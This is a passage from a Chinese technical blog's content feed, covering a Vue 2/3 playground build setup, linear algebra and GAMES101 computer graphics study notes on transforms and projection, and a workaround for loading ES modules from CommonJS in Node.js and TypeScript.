class="string">&#x27;vue2&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./style.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span> <span class="keyword">as</span> <span class="built_in">any</span>),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app-content&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main_vue3.ts, vue3 入口</span></span><br><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;vue3&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./style.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>);</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span><br></pre></td></tr></table></figure><p>HTML 模板也要变更，我们使用一个模板字符来代替入口文件：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;link rel=&quot;icon&quot; type=&quot;image/svg+xml&quot; href=&quot;/vite.svg&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Uni Component&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;app-content&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"><span class="addition">+     &lt;script type=&quot;module&quot; src=&quot;/src/main_vue%VUE_VERSION%.ts&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>配合 Vite 的插件功能，我们在编译 HTML 时，将模板字符 <code>VUE_VERSION</code> 进行替换：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// vite.config.ts</span><br><span class="line">// ... ...</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        // ... ..</span><br><span class="line"><span class="addition">+       &#123;</span></span><br><span class="line"><span class="addition">+           name: &#x27;html-rewriter&#x27;,</span></span><br><span class="line"><span class="addition">+           transformIndexHtml(html: string) &#123;</span></span><br><span class="line"><span class="addition">+               return html.replace(/%VUE_VERSION%/g, IS_VUE2 ? &#x27;2&#x27; : &#x27;3&#x27;);</span></span><br><span class="line"><span class="addition">+           &#125;,</span></span><br><span class="line"><span class="addition">+       &#125;,</span></span><br><span class="line">    ],</span><br><span class="line">    // ... ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们在 package.json 中定义不同的启动脚本：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;dev:vue2&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cross-env VITE_VUE_VERSION=2 vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dev:vue3&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cross-env VITE_VUE_VERSION=3 vite&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/EsunR/universal-vue-components/tree/main/packages/playground">Playground 模块实现参考</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> 前端工程化 </tag>
            
            <tag> Rollup </tag>
            
            <tag> 组件库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性代数的本质</title>
      <link href="/2024/08/8d22b257cdff.html"/>
      <url>/2024/08/8d22b257cdff.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-向量究竟是什么"><a href="#1-向量究竟是什么" class="headerlink" title="1. 向量究竟是什么"></a>1. 向量究竟是什么</h1><p><a href="https://www.bilibili.com/video/BV1Ys411k7yQ/?spm_id_from=333.788.recommend_more_video.-1&vd_source=b233b2041b0c7ce85a2c9111063e461f">视频</a></p><p><a href="https://www.youtube.com/watch?v=fNk_zzaMoSs">Youtube</a></p><p>二维向量的乘法：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818185517.png" alt="image.png|350"></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818185557.png" alt="image.png|350"></p><p>二维向量的加法：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818185628.png" alt="image.png|350"></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818185608.png" alt="image.png|350"></p><h1 id="2-线性组合、张成的空间与基"><a href="#2-线性组合、张成的空间与基" class="headerlink" title="2. 线性组合、张成的空间与基"></a>2. 线性组合、张成的空间与基</h1><p><a href="https://www.bilibili.com/video/BV12s411k7S5/?spm_id_from=333.788.recommend_more_video.0&vd_source=b233b2041b0c7ce85a2c9111063e461f">视频</a></p><p>单位向量，用字母 + hat 来表示</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818190325.png" alt="image.png|500"></p><p>通过改变所选择的标量，可以得到任何的二维向量：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818191630.gif" alt="20240818191630.gif|500"></p><p>如果只让其中一个标量变化，会画出两条相交的直线：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818192027.gif" alt="|500"></p><p>但是如果两个单位向量重叠，产生的新向量始终在一条线上：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818192621.png" alt="image.png|350"></p><p>如果两个单位向量的长度为 0，也只能乖乖呆在原点。</p><p><strong>所有可以表示为给定向量线性组合的向量集合，被称为给定向量“张成的空间”（span）。</strong></p><p>对于三维向量来说， 两个向量张成的空间就是他们所有可能的线性组合，也就是缩放再相加之后所有可能得到的向量。最终会是一个平面：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818193454.gif" alt="|500"></p><p>三个向量的张成空间可以得到空间中所有的三维向量：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818193857.gif" alt="2024-08-18 19.38.08.gif|500"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图形学 </tag>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Games101 闫令琪现代计算机图形学入门学习笔记</title>
      <link href="/2024/08/d7897066ddfe.html"/>
      <url>/2024/08/d7897066ddfe.html</url>
      
        <content type="html"><![CDATA[<h1 id="Lecture-03-变换（二维与三维）"><a href="#Lecture-03-变换（二维与三维）" class="headerlink" title="Lecture 03. 变换（二维与三维）"></a>Lecture 03. 变换（二维与三维）</h1><p><a href="https://sites.cs.ucsb.edu/~lingqi/teaching/resources/GAMES101_Lecture_03.pdf">课件</a></p><h3 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h3><p>缩放的数学形式表现：</p><p><code>x&#39;=s*x+0*y</code> <code>y&#39;=0*x+s*y</code></p><p>矩阵形式：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818183404.png" alt="image.png|400"></p><blockquote><p>矩阵相乘的条件是：前一个矩阵的列数必须等于后一个矩阵的行数。在这种情况下</p></blockquote><h3 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h3><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818195950.png" alt="image.png|400"></p><h3 id="切变"><a href="#切变" class="headerlink" title="切变"></a>切变</h3><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818200309.png" alt="image.png|400"></p><h3 id="旋转变换"><a href="#旋转变换" class="headerlink" title="旋转变换"></a>旋转变换</h3><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818200441.png" alt="image.png|400"></p><p>推导过程：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818200814.png" alt="image.png|400"></p><p>注意：旋转的中心永远是坐标轴的原点：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818203235.png" alt="image.png|400"></p><h3 id="平移与齐次坐标"><a href="#平移与齐次坐标" class="headerlink" title="平移与齐次坐标"></a>平移与齐次坐标</h3><p>平移无法直接用矩阵相乘的形式来表达：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818201050.png" alt="image.png|400"></p><p>虽然我们可以通过矩阵相乘再相加的方式来表示（这种叫做<strong>仿射变换</strong>）平移，但这也就意为这这个变化不是线性变化了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818201206.png" alt="image.png|400"></p><p>齐次坐标通过增加一个纬度的方式来解决了这个问题：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818201646.png" alt="image.png|400"></p><p>三维坐标中的点可以映射在二维坐标中：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818202225.png" alt="image.png|400"></p><p>仿射变换转为齐次坐标的方式，tx、ty 代表平移 ：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818202335.png" alt="image.png|400"></p><p>二维的变换都可以改写为齐次坐标，他们的意义是不会因为增加了一个纬度而改变的：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818202500.png" alt="image.png|400"></p><h3 id="复杂变换"><a href="#复杂变换" class="headerlink" title="复杂变换"></a>复杂变换</h3><p>使用矩阵相乘可以进行复杂的图形变换，但是相乘的顺序很重要：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818203410.png" alt="image.png|400"></p><p>形变顺序在矩阵相乘公式中是<strong>从左到右运算的</strong>，因此先旋转后平移的矩阵表达式为：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818203535.png" alt="image.png|400"></p><p>再举一个例子，如果想要改变图形的旋转中心，就可以先将其移动到原点，进行旋转后，再将其移动到原来的位置：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818204000.png" alt="image.png|400"></p><h3 id="三维空间中的形变"><a href="#三维空间中的形变" class="headerlink" title="三维空间中的形变"></a>三维空间中的形变</h3><p>相同的，在三维空间中如果发生了平移操作，也要转化为齐次坐标进行描述：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818204156.png" alt="image.png|400"></p><p>三维空间中使用齐次坐标描述仿射变换：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818204300.png" alt="image.png|400"></p><blockquote><p>上面的公式描述为先进行线性变换，再平移</p></blockquote><h3 id="补充：旋转矩阵的逆操作"><a href="#补充：旋转矩阵的逆操作" class="headerlink" title="补充：旋转矩阵的逆操作"></a>补充：旋转矩阵的逆操作</h3><p>对于旋转操作来说，如果想要旋转负的 θ 角（也就是逆操作），则要将 sinθ 进行取反，取反后的矩阵就正好是原矩阵的转置矩阵。</p><p>因此，我们可以说：在旋转里面，它的逆就等于旋转矩阵的转置：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818213206.png" alt="image.png|400"></p><p>在数学上，如果一个矩阵的逆等于它的转置，这个矩阵叫做正交矩阵。</p><h1 id="Lecture-04-变换（模型、视图、投影）"><a href="#Lecture-04-变换（模型、视图、投影）" class="headerlink" title="Lecture 04. 变换（模型、视图、投影）"></a>Lecture 04. 变换（模型、视图、投影）</h1><ul><li><a href="https://www.bilibili.com/video/BV1X7411F744?p=4&vd_source=b233b2041b0c7ce85a2c9111063e461f">视频</a></li><li><a href="https://sites.cs.ucsb.edu/~lingqi/teaching/resources/GAMES101_Lecture_04.pdf">课件</a></li></ul><h3 id="三维形变-——-缩放与平移"><a href="#三维形变-——-缩放与平移" class="headerlink" title="三维形变 —— 缩放与平移"></a>三维形变 —— 缩放与平移</h3><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818214538.png" alt="image.png|400"></p><h3 id="三维形变-——-旋转"><a href="#三维形变-——-旋转" class="headerlink" title="三维形变 —— 旋转"></a>三维形变 —— 旋转</h3><p>三维旋转比较复杂，我们可以拆分为单独绕某个轴进行旋转：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818214838.png" alt="image.png|230"></p><p>绕 x 轴旋转相当于 x 轴的坐标不变，所以与 x 相乘的第一行为 [1 0 0 0]：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818214813.png" alt="image.png|400"></p><p>相同的，绕 z 轴旋转就是 z 轴坐标对应相乘的矩阵行就是 [0 0 1 0]：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818215416.png" alt="image.png|400"></p><p>绕 y 轴旋转需要注意，sinα 的取值是负的，这是因为 xyz 的顺序决定的：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818215625.png" alt="image.png|400"></p><p>任意的三维旋转都可以写成绕 x 轴、绕 z 轴、绕 y 轴的旋转的组合：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818220153.png" alt="image.png|400"></p><p>三个轴的旋转量分别是 α、β、γ，数学上将其称之为<strong>欧拉角</strong>。</p><p>三个轴的旋转行为分别被称为 roll、yaw、pitch：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818220345.png" alt="image.png|400"></p><p>使用<strong>罗德里格斯旋转公式</strong>可以直接求得在三维空间里的向量绕着某个轴 n 旋转 α 角度后得到的最终向量，而不必将旋转进行 x、y、z 轴上的拆分：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818220833.png" alt="image.png|400"></p><h3 id="视图-相机变换"><a href="#视图-相机变换" class="headerlink" title="视图/相机变换"></a>视图/相机变换</h3><p>首先要定义相机的相关向量：</p><ul><li>相机的位置使用向量 e；</li><li>相机的朝向使用向量 h；</li><li>由于相机自身可能有旋转角度，因此我们使用一个“向上向量” t 来表示相机的自身旋转状态；</li></ul><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818223058.png" alt="image.png|400"></p><p>由于相机和被摄物体之间共同发生了旋转就相当于没有发生旋转，因此我们规定相机始终在世界原点，并且相机的初始朝向朝着 Z 轴的负方向（这是为了操作方便而规定的）：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818223520.png" alt="image.png|400"></p><p>将相机的向量规范为世界坐标的过程：</p><ol><li>将向量 e 放置到世界坐标的原点；</li><li>旋转向量 g 对其到坐标轴的 z 轴；</li><li>旋转向量 t 对其到坐标轴的 y 轴；</li><li>旋转后向量 g x  t 的结果就是 z 轴喽；</li></ol><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818224417.png" alt="image.png|400"></p><p>具体过程如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818224805.png" alt="image.png|500"></p><p>这里需要注意一下，由于将任意的轴旋转到一个规范化的轴上（向量 g 旋转到 -Z，向量 t 旋转到 Y， g x t 旋转到 X）的这一过程很不好描述，但是将规范化的轴（这个轴可以使用向量来表示，比如  (1,0,0)  表示 X 轴）旋转到某一向量上是比较好描述的，因此我们可以先求出后者。有因为旋转矩阵是一个正交矩阵，它的转置矩阵即是它的逆矩阵，这样我们就可以得到任意旋转轴到规范化轴上的旋转矩阵了。</p><p><a href="https://www.cnblogs.com/wbaoqing/p/5422974.html">关联</a></p><h3 id="正交相机拍摄的物体投影在显示设备上"><a href="#正交相机拍摄的物体投影在显示设备上" class="headerlink" title="正交相机拍摄的物体投影在显示设备上"></a>正交相机拍摄的物体投影在显示设备上</h3><p>正交投影和透视投影如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818230302.png" alt="image.png|400"></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818230515.png" alt="image.png|400"></p><p>正交投影的点线都是平行的，大多被用于工程视图，但是我们正常视角下都应该是透视投影。</p><p>对于正交投影来说，丢弃 Z 轴即可得到投影的结果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818230740.png" alt="image.png|400"></p><p>不管 x、y 的范围有多大，都将其归一化到 [-1, 1] 的取值范围内，这是约定俗成的，为了方便后续的计算。为了实现归一化，空间中的物体也要做相对应的缩放，其过程为先将物体移到原点，然后对物体缩放到 [-1, 1] 之间：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818231802.png" alt="image.png|400"></p><blockquote><p>在为了归一化而缩放过程中，可能会导致原有的物体被拉伸，如把原本的一个长方体空间拉伸成一个 1:1 的立方体，那么空间里的物体也会被响应的拉伸，最后完成时还要进行视口的还原。</p></blockquote><p>数学表达如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818232914.png" alt="image.png|400"></p><h3 id="透视相机拍摄的物体投影在显示设备上"><a href="#透视相机拍摄的物体投影在显示设备上" class="headerlink" title="透视相机拍摄的物体投影在显示设备上"></a>透视相机拍摄的物体投影在显示设备上</h3><p>在进行前，我们先回忆一下齐次坐标的性质，在齐次坐标中，<code>(x, y, z, 1)</code> 和 <code>(kx, ky, kz, k != 0)</code> 都表示同一个点，那么 <code>(xz, yz, z², z != 0)</code> 这个齐次坐标在三维空间中同样能表示 <code>(x, y, z)</code>。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818234709.png" alt="image.png|400"></p><p>我们前面已经知道了如何求正交相机的投影，那么对于透视相机来说，我们只要将透视相机的空间压缩为正交相机的空间，那么后续的过程都一样了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240818235418.png" alt="image.png|400"></p><p>根据相似三角形定理，远平面上的点映射到近平面上的点的坐标，就等于相机距离近平面的距离、与相机距离远平面的距离的比值，与原坐标相乘：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819000004.png" alt="image.png|400"></p><p>坐标点用齐次坐标表示后，可以通过上面得到的公式，得到一个透视空间被压缩为正交空间后的新的坐标，我们可以得到新的坐标的 x 和 y 值，但是无法得到转化后的 z 值。</p><blockquote><p>为什么 z 是 unknown ？</p><ul><li>挤压之后原本在Z方向上均匀分布的点将变得不均匀，疏密程度会发生变化</li><li>各位看清楚，这个相似三角形并不平行于yoz所在平面，n，z分别代表原点到对应点的距离而不是z值！这个相似三角形和z值完全没有关系自然得不到z值！！！</li></ul></blockquote><p>我们可以先将齐次坐标乘以 z，得到一个比较好处理的齐次坐标：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819001125.png" alt="image.png|400"></p><p>根据结果，我们可以反推出来将透视空间转为正交空间的投影矩阵：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819002027.png" alt="image.png|400"></p><p>为了求出矩阵的第三行，我们需要利用这个变换过程中的特性：</p><ul><li>任何近平面的点进过转换后，z 轴坐标不会发生改变；</li><li>任何远平面的点经过转换后，z 轴的坐标同样不会发生改变；</li></ul><p>那么我们就可以取近平面上的某一点 (x, y, n)，它的其次坐标为 (x, y, n, 1)，经过变换后的点仍为 (x, y, n, 1)，利用齐次坐标的特性，将其所有项都乘以 n 后得到 (nx, ny, n², n)：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819005932.png" alt="image.png|167"></p><p>那么我们就可以得到：</p><p>M x (x, y, z, 1) = (nx, ny, n², n)</p><p>进一步我们就可以假设我们要求的矩阵第三行为 [0 0 A B]（n² 与 xy 没有关系，所以与 xy 相乘的数必定是 0）：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819010210.png" alt="image.png|400"></p><p>进一步计算后得到计算公式：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819004302.png" alt="image.png|400"></p><p>但是具体的 A、B 是什么我们还未知，可能是 (n, 0) 也可能是 (0, n²)。此时我们还要利用另外一个特性，那就是远平面中心的点在经过转换后，z 轴坐标是不变的，假设这个点是 (0, 0, f)，那么转化为其次坐标后，我们就可以得到公式：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819004315.png" alt="image.png|400"></p><p>最终得出结果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240819004422.png" alt="image.png|400"></p><p>f 代表近平面的中心点到远平面的中心点之间的距离。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图形学 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> GAMES101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在 CJS 中使用 ES Module</title>
      <link href="/2024/08/ddeae8544671.html"/>
      <url>/2024/08/ddeae8544671.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>在 Nodejs 中，我们可以使用 <code>import</code> 来引入 CommonJS 和 ESM 的包，但是无法使用 <code>require</code> 来引入 ESM 规范的包，此时会出现 <code>ERR_REQUIRE_ESM</code> 的报错。</p><blockquote><p> 让我看看那哪个语言有两种包引入规范还不互相兼容，哦原来是 NodeJS</p></blockquote><p>为了解决 NodeJS 中存在两种包引入规范的问题，大部分的公共包作者会利用构建工具将自己的包编译成两份，并在 <code>package.json</code> 中声明对应 CJS 规范和 ESM 规范包锁在的位置。但是随着时间的推移，越来越多的公共包开发者不想再为 NodeJS 的这一特性买单，因此他们放弃了同时兼容多个包引入规范，而是专心使用 ESM 规范来进行开发（比如 <a href="https://github.com/sindresorhus/execa">execa</a>）。这就导致如果我们的项目基于 CommonJS 规范编写，就无法使用这些包。</p><p> 针对为什么 <code>require</code> 不支持引入 ESM 规范的包，之前有很多人的解释是 <code>import</code> 是异步的，所以不能支持。但事实上支持与否并不是技术问题，而是观念问题（可以看看<a href="https://joyeecheung.github.io/blog/2024/03/18/require-esm-in-node-js/">这篇文章</a>，讨论了 NodeJS 之前为什么不支持 <code>require</code> 方法来引用 ESM 规范的模块），其完全是可实现的，在 <a href="https://nodejs.org/en/blog/announcements/v22-release-announce#support-requireing-synchronous-esm-graphs">Node 22</a> 中使用 <code>--experimental-require-module</code> 就可以开启 <code>require</code> 对 ESM 的支持。</p><h1 id="2-解决问题"><a href="#2-解决问题" class="headerlink" title="2. 解决问题"></a>2. 解决问题</h1><p>对于很多旧的项目，将 CJS 转为 ESM 可能涉及的工作量很大，亦或是如果项目使用 Typescript，还会有很多人不会留意到即使使用了 <code>import</code> 写法，Typescript 最终也会根据默认配置将编译后的代码转为 <code>require</code> 写法。</p><p>因此最好无痛的让我们可以在 CommonJS 规范的项目中使用 ESM。</p><p>这也不是完全没有办法，很重要的一点是，虽然我们不能在 CJS 规范下使用 <code>import</code> 关键字来引入模块（会出现 <code>(node:31838) Warning: To load an ES module, set &quot;type&quot;: &quot;module&quot; in the package.json or use the .mjs extension.</code> 的错误），但是不代表我们不能使用 <code>import</code>  方法呀。</p><p><code>import</code> 是一个异步的方法，可以正常的解析 ESM 和 CJS 规范的包内容，并将包的导出内容作为结果进行返回，因此我们只需要异步的调用该方法即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; add &#125; = <span class="keyword">await</span> <span class="title function_">import</span>(<span class="string">&quot;./esm/utils.mjs&quot;</span>);</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>但是假如我们使用了 Typescript，前面我们也说了，在默认情况下 TS 会将你写的 <code>import</code> 语法转为 <code>require</code> 语法（可能是出于性能考虑，<code>require</code> 引入模块的性能优于 <code>import</code>），对于异步的 <code>import</code> 方法，Typescript 会“贴心”的将其转为 <code>__importStar</code> 方法，并仍然用 <code>require</code> 语法来对包进行引入。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> <span class="title function_">__awaiter</span>(<span class="built_in">void</span> <span class="number">0</span>, <span class="built_in">void</span> <span class="number">0</span>, <span class="built_in">void</span> <span class="number">0</span>, <span class="keyword">function</span>* () &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; add &#125; = <span class="keyword">yield</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;./esm/utils.mjs&quot;</span>)));</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;))();</span><br></pre></td></tr></table></figure><p>因此在这种情况下，我们不得不使用 <code>eval</code> 来执行代码了，Typescript 的代码应写为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; add &#125; = <span class="keyword">await</span> (<span class="built_in">eval</span>(<span class="string">`import(&quot;./esm/utils.mjs&quot;)`</span>) <span class="keyword">as</span> <span class="title class_">Promise</span>&lt;&#123;</span><br><span class="line">        <span class="attr">add</span>: <span class="title class_">Function</span>;</span><br><span class="line">    &#125;&gt;);</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这样编译后的代码就不会被 Typescript 偷偷转换了~</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esm </tag>
            
            <tag> cjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ts-node 在某些 Nodejs 版本中报错 Unknown file extension</title>
      <link href="/2024/07/4c1811f8987f.html"/>
      <url>/2024/07/4c1811f8987f.html</url>
      
